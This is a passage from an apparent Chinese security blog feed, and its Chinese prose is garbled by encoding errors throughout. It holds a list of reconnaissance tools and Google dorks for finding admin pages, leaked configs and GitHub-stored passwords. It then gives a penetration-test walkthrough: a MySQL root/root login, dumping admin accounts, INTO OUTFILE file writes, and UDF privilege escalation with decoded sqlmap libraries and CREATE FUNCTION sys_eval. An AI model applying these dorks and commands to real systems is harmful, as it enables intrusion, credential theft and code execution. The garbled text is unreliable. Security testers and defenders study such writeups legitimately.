class="hljs-regexp">//</span>whatweb.net/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/aac480d5c4cd5b7fac8006925b715e60"></p><h2 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h2><p>1ã€å¾¡å‰‘æ‰«æ</p><p><img src="https://img.tucang.cc/api/image/show/39c6f08cbc39d5725cdeaffac35cfa59"></p><p>2ã€dirbuster</p><p>é¦–å…ˆåœ¨Target URLè¾“å…¥æ¡†ä¸­è¾“å…¥è¦æ‰«æçš„ç½‘å€å¹¶å°†æ‰«æè¿‡ç¨‹ä¸­çš„è¯·æ±‚æ–¹æ³•è®¾ç½®ä¸ºâ€œAuto Switch(HEAD and GET)â€ã€‚</p><p>è‡ªè¡Œè®¾ç½®çº¿ç¨‹ï¼ˆå¤ªå¤§äº†å®¹æ˜“é€ æˆç³»ç»Ÿæ­»æœºå“¦ï¼‰</p><p>é€‰æ‹©æ‰«æç±»å‹ï¼Œå¦‚æœä½¿ç”¨ä¸ªäººå­—å…¸æ‰«æï¼Œåˆ™é€‰æ‹©â€œList based bruteforceâ€é€‰é¡¹ã€‚</p><p>å•å‡»â€œBrowseâ€åŠ è½½å­—å…¸ã€‚</p><p>å•æœºâ€œURL Fuzzâ€ï¼Œé€‰æ‹©URLæ¨¡ç³Šæµ‹è¯•ï¼ˆä¸é€‰æ‹©è¯¥é€‰é¡¹åˆ™ä½¿ç”¨æ ‡å‡†æ¨¡å¼ï¼‰</p><p>åœ¨URL to fuzzé‡Œè¾“å…¥â€œ&#x2F;{dir}â€ã€‚è¿™é‡Œçš„{dir}æ˜¯ä¸€ä¸ªå˜é‡ï¼Œç”¨æ¥ä»£è¡¨å­—å…¸ä¸­çš„æ¯ä¸€è¡Œï¼Œè¿è¡Œæ—¶{dir}ä¼šè¢«å­—å…¸ä¸­çš„ç›®å½•æ›¿æ¢æ‰ã€‚</p><p>ç‚¹å‡»â€œstartâ€å¼€å§‹æ‰«æ</p><p><img src="https://img.tucang.cc/api/image/show/a167bc0133d97d3948955610b3211f4b"></p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨kaliè‡ªå¸¦çš„</p><p><img src="https://img.tucang.cc/api/image/show/64ebcc9ba34d34b6524f8c30beec9306"></p><p>3ã€dirscan</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ä¸‹è½½åœ°å€ï¼šhttps:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/j3ers3/</span>Dirscan<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/779477dd611f2dbdf14f0b22870ece96"></p><p>4ã€dirsearch</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ä¸‹è½½åœ°å€ï¼šhttps:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/maurosoria/</span>dirsearch<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/89c4ee42ea2bc608dcab8586f3de3526"></p><h2 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h2><p>ä»–åŸºæœ¬è¯­æ³•ä¸Šè¾¹æœ‰ä»‹ç»ï¼Œä»‹ç»ä¸‹å…¸å‹ç”¨æ³•ï¼š</p><p>æŸ¥æ‰¾æŒ‡å®šåå°åœ°å€</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">site:xx.com intext:ç®¡ç† |<span class="hljs-string"> åå° </span>|<span class="hljs-string"> åå°ç®¡ç† </span>|<span class="hljs-string"> ç™»é™† </span>|<span class="hljs-string"> ç™»å½• </span>|<span class="hljs-string"> ç”¨æˆ·å </span>|<span class="hljs-string"> å¯†ç  </span>|<span class="hljs-string"> ç³»ç»Ÿ </span>|<span class="hljs-string"> è´¦å· </span>|<span class="hljs-string"> login </span>|<span class="hljs-string"> system</span><br><span class="hljs-string">site:xx.com inurl:login </span>|<span class="hljs-string"> inurl:admin </span>|<span class="hljs-string"> inurl:manage </span>|<span class="hljs-string"> inurl:manager </span>|<span class="hljs-string"> inurl:admin_login </span>|<span class="hljs-string"> inurl:system </span>|<span class="hljs-string"> inurl:backend</span><br><span class="hljs-string">site:xx.com intitle:ç®¡ç† </span>|<span class="hljs-string"> åå° </span>|<span class="hljs-string"> åå°ç®¡ç† </span>|<span class="hljs-string"> ç™»é™† </span>|<span class="hljs-string"> ç™»å½•</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æŒ‡å®šç½‘ç«™çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">site:xx.<span class="hljs-keyword">com</span> inur<span class="hljs-variable">l:file</span><br>site:xx.<span class="hljs-keyword">com</span> inur<span class="hljs-variable">l:load</span><br>site:xx.<span class="hljs-keyword">com</span> inur<span class="hljs-variable">l:upload</span><br></code></pre></td></tr></table></figure><p>æ³¨å…¥é¡µé¢</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">site:xx.<span class="hljs-keyword">com</span> inur<span class="hljs-variable">l:php</span>?id=<br></code></pre></td></tr></table></figure><p>ç›®å½•éå†æ¼æ´</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">site:xx.<span class="hljs-keyword">com</span> intitle:<span class="hljs-built_in">index</span>.of<br></code></pre></td></tr></table></figure><p>SQLé”™è¯¯</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">site:xx.com intext:<span class="hljs-string">&quot;sql syntax near&quot;</span> | <span class="hljs-type">intext</span>:<span class="hljs-string">&quot;syntax error has occurred&quot;</span> | <span class="hljs-type">intext</span>:<span class="hljs-string">&quot;incorrect syntax near&quot;</span> | <span class="hljs-type">intext</span>:<span class="hljs-string">&quot;unexpected end of SQL command&quot;</span> | <span class="hljs-type">intext</span>:<span class="hljs-string">&quot;Warning: mysql_connect()&quot;</span> | <span class="hljs-type">intext</span>:â€Warning: mysql_query()<span class="hljs-string">&quot; | intext:â€Warning: pg_connect()&quot;</span><br></code></pre></td></tr></table></figure><p>phpinfo()</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">site:xx.<span class="hljs-keyword">com</span> <span class="hljs-keyword">ex</span><span class="hljs-variable">t:php</span> intitle:phpinfo <span class="hljs-string">&quot;published by the PHP Group&quot;</span><br></code></pre></td></tr></table></figure><p>é…ç½®æ–‡ä»¶æ³„éœ²</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">site:xx.com ext:.xml | <span class="hljs-type">.conf</span> | <span class="hljs-type">.cnf</span> | <span class="hljs-type">.reg</span> | <span class="hljs-type">.inf</span> | <span class="hljs-type">.rdp</span> | <span class="hljs-type">.cfg</span> | <span class="hljs-type">.txt</span> | <span class="hljs-type">.ora</span> | <span class="hljs-type">.ini</span><br></code></pre></td></tr></table></figure><p>æ•°æ®åº“æ–‡ä»¶æ³„éœ²</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">site:xx.com ext:.sql | <span class="hljs-type">.dbf</span> | <span class="hljs-type">.mdb</span> | <span class="hljs-type">.db</span><br></code></pre></td></tr></table></figure><p>æ—¥å¿—æ–‡ä»¶æ³„éœ²</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">site:xx.<span class="hljs-keyword">com</span> ext:.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>å¤‡ä»½å’Œå†å²æ–‡ä»¶æ³„éœ²</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">site:xx.com ext:.bkf | <span class="hljs-type">.bkp</span> | <span class="hljs-type">.old</span> | <span class="hljs-type">.backup</span> | <span class="hljs-type">.bak</span> | <span class="hljs-type">.swp</span> | <span class="hljs-type">.rar</span> | <span class="hljs-type">.txt</span> | <span class="hljs-type">.zip</span> | <span class="hljs-type">.7z</span> | <span class="hljs-type">.sql</span> | <span class="hljs-type">.tar</span>.gz | <span class="hljs-type">.tgz</span> | <span class="hljs-type">.tar</span><br></code></pre></td></tr></table></figure><p>å…¬å¼€æ–‡ä»¶æ³„éœ²</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">site:xx.com filetype:.doc | <span class="hljs-type">.docx</span> | <span class="hljs-type">.xls</span> | <span class="hljs-type">.xlsx</span> | <span class="hljs-type">.ppt</span> | <span class="hljs-type">.pptx</span> | <span class="hljs-type">.odt</span> | <span class="hljs-type">.pdf</span> | <span class="hljs-type">.rtf</span> | <span class="hljs-type">.sxw</span> | <span class="hljs-type">.psw</span> | <span class="hljs-type">.csv</span><br></code></pre></td></tr></table></figure><p>é‚®ç®±ä¿¡æ¯</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">site:xx<span class="hljs-selector-class">.com</span> intext:@xx<span class="hljs-selector-class">.comsite</span>:xx<span class="hljs-selector-class">.com</span> é‚®ä»¶site:xx<span class="hljs-selector-class">.com</span> email<br></code></pre></td></tr></table></figure><p>ç¤¾å·¥ä¿¡æ¯</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">site:xx.com intitle:è´¦å· |<span class="hljs-string"> å¯†ç  </span>|<span class="hljs-string"> å·¥å· </span>|<span class="hljs-string"> å­¦å·</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡ç”¨æˆ·çš„ä¸€äº›ä¿¡æ¯ï¼ˆMailã€Nameã€IDã€Telï¼‰æŸ¥è¯¢ç”¨æˆ·æ³¨å†Œè¿‡å“ªäº›åº”ç”¨</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.reg007.com/<br></code></pre></td></tr></table></figure><h2 id="Githubä¿¡æ¯æ³„æ¼"><a href="#Githubä¿¡æ¯æ³„æ¼" class="headerlink" title="Githubä¿¡æ¯æ³„æ¼"></a>Githubä¿¡æ¯æ³„æ¼</h2><p>å¾ˆå¤šç½‘ç«™åŠç³»ç»Ÿéƒ½ä¼šä½¿ç”¨pop3å’Œsmtpå‘é€æ¥é‚®ä»¶ï¼Œä¸å°‘å¼€å‘è€…ç”±äºå®‰å…¨æ„è¯†ä¸è¶³ä¼šæŠŠç›¸å…³çš„é…ç½®æ–‡ä»¶ä¿¡æ¯ä¹Ÿæ”¾åˆ°Githubä¸Šï¼Œæ‰€ä»¥å¦‚æœè¿™æ—¶å€™æˆ‘ä»¬åŠ¨ç”¨ä¸€ä¸‹Googleæœç´¢è¯­æ³•ï¼Œå°±èƒ½æŠŠè¿™äº›æ•æ„Ÿä¿¡æ¯ç»™æ‰¾å‡ºæ¥äº†ã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">site:Github<span class="hljs-selector-class">.com</span> smtp<br>site:Github<span class="hljs-selector-class">.com</span> smtp @qq<span class="hljs-selector-class">.com</span><br>site:Github<span class="hljs-selector-class">.com</span> smtp @<span class="hljs-number">126</span><span class="hljs-selector-class">.com</span><br>site:Github<span class="hljs-selector-class">.com</span> smtp @<span class="hljs-number">163</span><span class="hljs-selector-class">.com</span><br>site:Github<span class="hljs-selector-class">.com</span> smtp @sina<span class="hljs-selector-class">.com</span>.cn<br></code></pre></td></tr></table></figure><p>æ•°æ®åº“ä¿¡æ¯æ³„éœ²ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">site:Github.<span class="hljs-keyword">com</span> <span class="hljs-keyword">sa</span> password<br>site:Github.<span class="hljs-keyword">com</span> root password<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Information</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä» MySQL å¼±å£ä»¤åˆ°å“¥æ–¯æ‹‰ä¸Šçº¿</title>
    <link href="/2023/04/12/mysql_weakpass_getshell/"/>
    <url>/2023/04/12/mysql_weakpass_getshell/</url>
    
    <content type="html"><![CDATA[<h1 id="ä»-MySQL-å¼±å£ä»¤åˆ°å“¥æ–¯æ‹‰ä¸Šçº¿"><a href="#ä»-MySQL-å¼±å£ä»¤åˆ°å“¥æ–¯æ‹‰ä¸Šçº¿" class="headerlink" title="ä» MySQL å¼±å£ä»¤åˆ°å“¥æ–¯æ‹‰ä¸Šçº¿"></a>ä» MySQL å¼±å£ä»¤åˆ°å“¥æ–¯æ‹‰ä¸Šçº¿</h1><p>ç»™ä¸€ä¸ªå®¢æˆ·ç³»ç»Ÿåšæ¸—é€ï¼Œè®°å½•ä¸‹è¿‡ç¨‹</p><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>æ²¡æœ‰æµ‹è¯•è´¦å·ï¼Œæœ¬æ¥æ²¡æŠ±å¸Œæœ›ï¼Œæ‰“ç®—æ‰¾å‡ ä¸ªæ°´æ´ï¼Œæ‰¾ä¸åˆ°æ´ï¼Œå°è¯•æ‰«ä¸ªç«¯å£å‘ç° 3306 æ˜¯å¼€æ”¾çš„</p><p><img src="https://img.tucang.cc/api/image/show/e0991aa643bf2946fca602c3f8f057b3" alt="image-20230412182240949"></p><h2 id="å¼±å£ä»¤"><a href="#å¼±å£ä»¤" class="headerlink" title="å¼±å£ä»¤"></a>å¼±å£ä»¤</h2><p>ä¹ æƒ¯æ€§å°è¯•ä½¿ç”¨ <code>root/root</code> è¿æ¥æ•°æ®åº“ï¼Œè¿æ¥æˆåŠŸ</p><p><img src="https://img.tucang.cc/api/image/show/41f2ad6ad45f2686bb0d917f591ccbb1" alt="image-20230412182344175"></p><h2 id="æ•°æ®æ³„éœ²"><a href="#æ•°æ®æ³„éœ²" class="headerlink" title="æ•°æ®æ³„éœ²"></a>æ•°æ®æ³„éœ²</h2><p>æ•°æ®åº“æŸ¥è¯¢åˆ°ç”¨æˆ·ä¿¡æ¯ï¼Œå¯†ç ä¸ºmd5å­˜å‚¨</p><p><img src="https://img.tucang.cc/api/image/show/32bf4c2082bca9fa088c85815577c0f7" alt="image-20230412182914040"></p><p>æŸ¥è¯¢å¾—åˆ°è´¦å·ä¿¡æ¯ï¼š</p><p><img src="https://img.tucang.cc/api/image/show/3da435c12edd4182def638a85191d69b" alt="image-20230412182837718"></p><p>ç™»é™†æˆåŠŸï¼Œå…±ä¸¤ä¸ªç®¡ç†å‘˜è´¦å·</p><p><img src="https://img.tucang.cc/api/image/show/3072f49bcb28f10ce3ef618a8f6bc6d7" alt="image-20230412182938172"></p><h2 id="å°è¯•å†™ğŸ"><a href="#å°è¯•å†™ğŸ" class="headerlink" title="å°è¯•å†™ğŸ"></a>å°è¯•å†™ğŸ</h2><p>åœ¨webåº”ç”¨æ²¡æœ‰æ‰¾åˆ°ä¸Šä¼ ç‚¹ï¼Œå°è¯•æ•°æ®åº“å†™ğŸè¯•è¯•</p><p>å†™æ–‡ä»¶çš„å‰æï¼š</p><ol><li>çŸ¥é“ç½‘ç«™ç‰©ç†è·¯å¾„</li><li>é«˜æƒé™æ•°æ®åº“ç”¨æˆ·</li><li><code>load_file()</code> å¼€å¯ å³ <code>secure_file_priv</code> æ— é™åˆ¶</li><li>ç½‘ç«™è·¯å¾„æœ‰å†™å…¥æƒé™</li></ol><p>æŸ¥çœ‹<code>secure_file_priv</code> ä¸ºç©º</p><p><img src="https://img.tucang.cc/api/image/show/89f7d72b1ac549026f724587fe3ca9af" alt="image-20230412145715965"></p><table><thead><tr><th>Value</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>NULL</td><td>ä¸å…è®¸å¯¼å…¥æˆ–å¯¼å‡º</td></tr><tr><td>&#x2F;tmp</td><td>åªå…è®¸åœ¨ &#x2F;tmp ç›®å½•å¯¼å…¥å¯¼å‡º</td></tr><tr><td>ç©º</td><td>ä¸é™åˆ¶ç›®å½•</td></tr></tbody></table><blockquote><p>åœ¨ MySQL 5.5 ä¹‹å‰ secure_file_priv é»˜è®¤æ˜¯ç©ºï¼Œè¿™ä¸ªæƒ…å†µä¸‹å¯ä»¥å‘ä»»æ„ç»å¯¹è·¯å¾„å†™æ–‡ä»¶</p><p>åœ¨ MySQL 5.5 ä¹‹å secure_file_priv é»˜è®¤æ˜¯ NULLï¼Œè¿™ä¸ªæƒ…å†µä¸‹ä¸å¯ä»¥å†™æ–‡ä»¶</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select &#x27;hello&#x27; into outfile &#x27;xxxxx/123.txt&#x27;;<br></code></pre></td></tr></table></figure><p>æ–‡ä»¶å¯ä»¥å†™å…¥ï¼Œå¹¶ä¸”å¯ä»¥è¯»å‡ºæ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select load_file(&#x27;xxxxxx/123.txt&#x27;);<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/aa1fec1a257db5b2a32c3f28c2cc7830" alt="image-20230412183651820"></p><p>ä½†æ‰¾éäº†æ•°æ®åº“ä¹Ÿæ²¡æ‰¾åˆ°æœ‰å‡ºç° web åº”ç”¨è·¯å¾„çš„åœ°æ–¹</p><h2 id="å°è¯•UDFææƒ"><a href="#å°è¯•UDFææƒ" class="headerlink" title="å°è¯•UDFææƒ"></a>å°è¯•UDFææƒ</h2><h3 id="MUDT"><a href="#MUDT" class="headerlink" title="MUDT"></a>MUDT</h3><p>æˆ‘ä»¬æ˜¯ç›´æ¥è¿çš„æ•°æ®åº“ï¼Œæ²¡æœ‰æ³¨å…¥ç‚¹ï¼Œå› æ­¤æ— æ³•ç”¨sqlmapè¿›è¡Œææƒï¼Œå…ˆå°è¯•ä¸€æ³¢ MDUT å·¥å…·ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ææƒ</p><p><img src="https://img.tucang.cc/api/image/show/d913118d5612b7a471f3ab611d8e3a8e" alt="image-20230412182635522"></p><p>ä½†åˆ›å»ºå‡½æ•°å¤±è´¥</p><p><img src="https://img.tucang.cc/api/image/show/6fbdc3357007d6c20aea8c3854014db1" alt="WeChatWorkScreenshot_e83eb0cc-441d-4cd9-817f-9ec641eb6cb3"></p><h3 id="æ‰‹åŠ¨å°è¯•ä¸€æ¬¡"><a href="#æ‰‹åŠ¨å°è¯•ä¸€æ¬¡" class="headerlink" title="æ‰‹åŠ¨å°è¯•ä¸€æ¬¡"></a>æ‰‹åŠ¨å°è¯•ä¸€æ¬¡</h3><h4 id="plugin-æ–‡ä»¶å¤¹"><a href="#plugin-æ–‡ä»¶å¤¹" class="headerlink" title="plugin æ–‡ä»¶å¤¹"></a>plugin æ–‡ä»¶å¤¹</h4><p>å¦‚æœæ˜¯ MySQL &gt;&#x3D; 5.1 çš„ç‰ˆæœ¬ï¼Œå¿…é¡»æŠŠ UDF çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶æ”¾ç½®äº MySQL å®‰è£…ç›®å½•ä¸‹çš„ lib\plugin æ–‡ä»¶å¤¹ä¸‹æ–‡ä»¶å¤¹ä¸‹æ‰èƒ½åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">show variables like &#x27;%plugin%&#x27;;<br></code></pre></td></tr></table></figure><p>å·²ç»å­˜åœ¨ <code>plugin</code> æ–‡ä»¶å¤¹äº†</p><p><img src="https://img.tucang.cc/api/image/show/75bd932cb82b2bfbac582baffb87ecfd" alt="image-20230412183354599"></p><p>å¦‚æœä¸å­˜åœ¨çš„è¯å¯ä»¥åœ¨ webshell ä¸­æ‰¾åˆ° MySQL çš„å®‰è£…ç›®å½•ç„¶åæ‰‹å·¥åˆ›å»º <code>\lib\plugin</code> æ–‡ä»¶å¤¹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql &gt; <span class="hljs-keyword">select</span> 123 into dumpfile <span class="hljs-string">&#x27;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="ä¼ å…¥åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶"><a href="#ä¼ å…¥åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶" class="headerlink" title="ä¼ å…¥åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶"></a>ä¼ å…¥åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶</h4><p>é‚£ä¹ˆåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶å»å“ªé‡Œæ‰¾å‘¢ï¼Ÿå®é™…ä¸Šæˆ‘ä»¬å¸¸ç”¨çš„å·¥å…· sqlmap å’Œ Metasploit é‡Œé¢éƒ½è‡ªå¸¦äº†å¯¹åº”ç³»ç»Ÿçš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ã€‚</p><ul><li><strong>sqlmap çš„ UDF åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ä½ç½®</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmapæ ¹ç›®å½•/data/udf/mysql<br></code></pre></td></tr></table></figure><p>ç™½å«–ä¸ªå›¾ï¼š</p><p><img src="https://img.tucang.cc/api/image/show/54a2e1db3edfe8c4e88304d2dcdb02ce" alt="img"></p><p>ä¸è¿‡ sqlmap ä¸­ è‡ªå¸¦è¿™äº›åŠ¨æ€é“¾æ¥åº“ä¸ºäº†é˜²æ­¢è¢«è¯¯æ€éƒ½ç»è¿‡ç¼–ç å¤„ç†è¿‡ï¼Œä¸èƒ½è¢«ç›´æ¥ä½¿ç”¨ã€‚ä¸è¿‡å¯ä»¥åˆ©ç”¨ sqlmap è‡ªå¸¦çš„è§£ç å·¥å…· cloak.py æ¥è§£ç ä½¿ç”¨ï¼Œcloak.py çš„ä½ç½®ä¸ºï¼š<code>/extra/cloak/cloak.py</code> ï¼Œè§£ç æ–¹æ³•å¦‚ä¸‹ï¼šï¼ˆç™½å«–ä¸ªæ–¹æ³•ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥çœ‹å½“å‰ç›®å½•æƒ…å†µ</span><br>âœ <span class="hljs-built_in">pwd</span><br>/Users/guang/Documents/X1ct34m/sqlmap/1.4.6/extra/cloak<br><br><span class="hljs-comment"># è§£ç  32 ä½çš„ Linux åŠ¨æ€é“¾æ¥åº“</span><br>âœ python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so<br><br><span class="hljs-comment"># è§£ç  64 ä½çš„ Linux åŠ¨æ€é“¾æ¥åº“</span><br>âœ python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so<br><br><span class="hljs-comment"># è§£ç  32 ä½çš„ Windows åŠ¨æ€é“¾æ¥åº“</span><br>âœ python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll<br><br><span class="hljs-comment"># è§£ç  64 ä½çš„ Windows åŠ¨æ€é“¾æ¥åº“</span><br>âœ python3 cloak.py -d -i ../../data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll<br><br><span class="hljs-comment"># æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æƒ…å†µ</span><br>âœ <span class="hljs-built_in">ls</span><br>README.txt              cloak.py                lib_mysqludf_sys_32.so  lib_mysqludf_sys_64.so<br>__init__.py             lib_mysqludf_sys_32.dll lib_mysqludf_sys_64.dll<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªåšä¸»æ‰“åŒ…äº† sqlmap è§£ç åçš„åŠ¨æ€é“¾æ¥åº“ï¼š<a href="https://sqlsec.lanzoux.com/i4b7jhyhwid">è“å¥äº‘ - sqlmap udf.zip</a> éœ€è¦çš„æœ‹å‹å¯ä»¥è‡ªæ</p><ul><li><strong>Metasploit çš„ UDF åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ä½ç½®</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">MSF æ ¹ç›®å½•/embedded/framework/data/exploits/mysql<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/f883960dbe9c01981811403e5f04e35b" alt="img"></p><p>Metasploit è‡ªå¸¦çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶æ— éœ€è§£ç ï¼Œå¼€ç®±å³å¯é£Ÿç”¨ã€‚</p><p>ä½¿ç”¨ 010-Editor å¯¹æ¯”äº† metsaploit è‡ªå¸¦çš„ä¸ sqlmap è§£ç åçš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼Œå‘ç°ä»–ä»¬çš„å†…å®¹ä¸€æ¨¡ä¸€æ ·ã€‚</p><p>ä¸‹é¢æ¥çœ‹ä¸‹åŠ¨æ€é“¾æ¥åº“é‡Œé¢æœ‰åŒ…å«äº†å“ªäº›å‡½æ•°ï¼š</p><p><img src="https://img.tucang.cc/api/image/show/34d3e091b7bcf3ada67ce6eaa1c555bf" alt="img"></p><p>å¦‚æœæœ‰æ³¨å…¥ç‚¹çš„è¯å¯ä»¥å°è¯•ç”¨ SQLMAPï¼Œè¿™é‡Œæ²¡æœ‰ï¼Œæ¥ç€æ‰‹åŠ¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"># ç›´æ¥ <span class="hljs-keyword">SELECT</span> æŸ¥è¯¢åå…­è¿›åˆ¶å†™å…¥<br><span class="hljs-keyword">SELECT</span> <span class="hljs-number">0x7f454c4602</span>... <span class="hljs-keyword">INTO</span> DUMPFILE <span class="hljs-string">&#x27;xxxxx/plugin/udf.dll&#x27;</span>;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰åå…­è¿›åˆ¶çš„è¯­å¥ï¼Œå°†è·¯å¾„æ”¹æˆå®é™…è·¯å¾„å³å¯ <a href="https://www.sqlsec.com/udf/">UDFåå…­è¿›åˆ¶</a></p><h4 id="åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶è°ƒç”¨å‘½ä»¤"><a href="#åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶è°ƒç”¨å‘½ä»¤" class="headerlink" title="åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶è°ƒç”¨å‘½ä»¤"></a>åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶è°ƒç”¨å‘½ä»¤</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql &gt; CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¾æ—§æŠ¥é”™</p><p><img src="https://img.tucang.cc/api/image/show/ce64b702b3dcb17afd38ee1858b6e3ee" alt="image-20230412184927566"></p><blockquote><p>1123 - Canâ€™t initialize function â€˜sys_evalâ€™; UDFs are unavailable with the â€“skip-grant-tables option</p></blockquote><p>éœ€è¦å°† <code>my.ini</code> ä¸­çš„ <code>skip-grant-tables</code> é€‰é¡¹å»æ‰</p><p>è¯» <code>xxxxx/my.ini</code> 